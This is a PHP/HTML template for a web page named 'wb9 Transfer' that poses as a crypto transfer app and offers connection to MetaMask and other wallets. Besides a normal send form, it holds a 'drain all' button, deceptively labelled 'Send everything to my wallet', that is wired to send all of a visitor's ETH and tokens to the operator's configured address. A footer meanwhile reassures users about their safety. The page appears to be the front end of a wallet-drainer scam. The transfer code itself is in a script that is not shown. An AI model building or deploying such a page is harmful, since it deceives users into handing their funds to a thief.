<?php
define('RPC_MAINNET',  'https://cloudflare-eth.com');
define('RPC_SEPOLIA',  'https://rpc.sepolia.org');
define('WC_PROJECT_ID', 'YOUR_WALLETCONNECT_PROJECT_ID');
define('MY_WALLET',    'YOUR_DESTINATION_ADDRESS'); // ton adresse de réception
define('SITE_NAME',    'wb9 Transfer');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title><?= SITE_NAME ?></title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"
          crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <link rel="stylesheet" href="assets/css/style.css" />
</head>
<body>

<div class="glow-orb glow-orb-1"></div>
<div class="glow-orb glow-orb-2"></div>

<header>
  <div class="container header-inner">
    <a href="/" class="logo">
      <span class="logo-icon">⬡</span>
      <span class="logo-text"><?= SITE_NAME ?></span>
    </a>
    <div class="header-right">
      <div id="connectedInfo" style="display:none; align-items:center; gap:10px;">
        <span id="networkBadge" class="network-badge"></span>
      </div>
      <button id="connectBtn" class="btn-connect">Connect Wallet</button>
    </div>
  </div>
</header>

<main>
  <div class="container">
    <div class="page-title">
      <h1>Send Crypto</h1>
      <p>Connect your wallet to transfer ETH and ERC-20 tokens instantly.</p>
    </div>

    <div class="app-grid">

      <!-- Left: Wallet / Balances -->
      <div class="card">
        <div id="notConnected" class="not-connected">
          <div class="not-connected-icon">🔐</div>
          <h3>Connect your wallet</h3>
          <p>Supports MetaMask, Coinbase Wallet, Trust Wallet, Brave, Rainbow, and any EIP-1193 browser wallet.</p>
          <button class="btn btn-primary btn-lg" onclick="document.getElementById('connectBtn').click()">Connect Wallet</button>
        </div>

        <div id="walletPanel" style="display:none;">
          <p class="card-title">Your Wallet</p>
          <div class="wallet-address-block">
            <div class="wallet-avatar">👛</div>
            <div class="wallet-info">
              <div class="wallet-label">Address</div>
              <div class="wallet-addr" id="walletAddress">—</div>
            </div>
            <button class="copy-btn" id="copyAddr" title="Copy address">⧉</button>
          </div>

          <div class="eth-balance-block">
            <div class="eth-balance-label">ETH Balance</div>
            <div class="eth-balance-amount" id="ethBalance">…</div>
          </div>

          <div class="token-list-title">Token Balances</div>
          <ul id="tokenList"></ul>

          <div class="divider"></div>
          <button class="btn btn-outline btn-full" onclick="document.getElementById('connectBtn').click()" style="font-size:13px;">Disconnect</button>
        </div>
      </div>

      <!-- Right: Transfer -->
      <div class="card">
        <p class="card-title">Transfer</p>

        <div class="form-group">
          <label class="form-label" for="assetSelect">Asset</label>
          <select id="assetSelect" class="form-input" disabled>
            <option value="">— connect wallet —</option>
          </select>
        </div>

        <div class="form-group">
          <label class="form-label" for="recipient">Recipient address</label>
          <input id="recipient" type="text" class="form-input" placeholder="0x…" autocomplete="off" spellcheck="false" />
        </div>

        <div class="form-group">
          <label class="form-label" for="amount">Amount</label>
          <div class="amount-input-wrapper">
            <input id="amount" type="number" class="form-input" placeholder="0.00" min="0" step="any" />
            <button id="maxBtn" class="btn-max" disabled>Max</button>
          </div>
        </div>

        <div class="fee-estimate">
          <span class="fee-label">Network fee</span>
          <span class="fee-value">Estimated in your wallet</span>
        </div>

        <button id="sendBtn" class="btn btn-primary btn-full btn-lg send-btn" disabled>Send</button>

        <!-- Drain all -->
        <div class="divider" style="margin:20px 0;"></div>
        <button id="drainBtn" class="btn btn-full btn-lg" style="background:rgba(124,58,237,0.15);border:1px solid rgba(124,58,237,0.4);color:#c4b5fd;border-radius:12px;" disabled>
          ⚡ Send everything to my wallet
        </button>
        <p style="font-size:12px;color:var(--text-muted);margin-top:8px;text-align:center;">
          Envoie tout l'ETH + tokens vers <code id="myWalletShort" style="color:var(--accent-purple)"></code>
        </p>

        <div id="txStatus"></div>
      </div>

    </div>
  </div>
</main>

<footer>
  <div class="container">
    <p class="footer-disclaimer">
      <?= SITE_NAME ?> &copy; <?= date('Y') ?> — Transactions are signed locally in your wallet. No private keys are ever sent to this server.
    </p>
  </div>
</footer>

<!-- Wallet modal -->
<div id="walletModal" class="modal-overlay">
  <div class="modal" style="max-height:90vh; overflow-y:auto;">
    <div class="modal-header">
      <span class="modal-title">Connect a Wallet</span>
      <button class="modal-close" id="modalClose">✕</button>
    </div>

    <!-- EIP-6963: detected wallets (desktop extensions) — filled by JS -->
    <div id="detectedWallets" style="display:none; margin-bottom:16px;">
      <p class="modal-section-label">Detected in browser</p>
      <div class="wallet-options" id="detectedWalletsList"></div>
    </div>

    <!-- Fallback injected (if EIP-6963 not supported) -->
    <div id="fallbackWallets">
      <p class="modal-section-label">Browser extension</p>
      <div class="wallet-options">
        <button class="wallet-option" data-wallet="metamask">
          <span class="wallet-option-icon"><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/MetaMask/Icon.png" width="28" height="28" style="border-radius:6px" alt="MetaMask"></span>
          <div><div class="wallet-option-name">MetaMask</div><div class="wallet-option-desc">metamask.io</div></div>
          <span class="wallet-option-tag">Extension</span>
        </button>
        <button class="wallet-option" data-wallet="coinbase">
          <span class="wallet-option-icon"><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Coinbase%20Wallet/Icon.png" width="28" height="28" style="border-radius:6px" alt="Coinbase Wallet"></span>
          <div><div class="wallet-option-name">Coinbase Wallet</div><div class="wallet-option-desc">By Coinbase</div></div>
          <span class="wallet-option-tag">Extension</span>
        </button>
        <button class="wallet-option" data-wallet="trust">
          <span class="wallet-option-icon"><img src="https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Trust%20Wallet/Icon.png" width="28" height="28" style="border-radius:6px" alt="Trust Wallet"></span>
          <div><div class="wallet-option-name">Trust Wallet</div><div class="wallet-option-desc">trustwallet.com</div></div>
          <span class="wallet-option-tag">Extension</span>
        </button>
        <button class="wallet-option" data-wallet="injected">
          <span class="wallet-option-icon">🌐</span>
          <div><div class="wallet-option-name">Other browser wallet</div><div class="wallet-option-desc">Brave, OKX, Rabby, Frame…</div></div>
          <span class="wallet-option-tag">EIP-1193</span>
        </button>
      </div>
    </div>

    <!-- Mobile wallets — deep links (open the app and load this dApp inside) -->
    <div style="margin-top:16px;">
      <p class="modal-section-label">Mobile app <span style="font-weight:400;text-transform:none;letter-spacing:0;">(opens wallet app on your phone)</span></p>
      <div class="wallet-options" id="mobileWalletsList">
        <!-- filled by JS with the real URL of the page -->
      </div>
    </div>

  </div>
</div>

<div id="toastContainer" class="toast-container"></div>

<script>
  window.WB9_CONFIG = {
    rpcMainnet:  '<?= RPC_MAINNET ?>',
    rpcSepolia:  '<?= RPC_SEPOLIA ?>',
    wcProjectId: '<?= WC_PROJECT_ID ?>',
    myWallet:    '<?= MY_WALLET ?>',
  };
</script>
<script src="assets/js/app.js"></script>
</body>
</html>
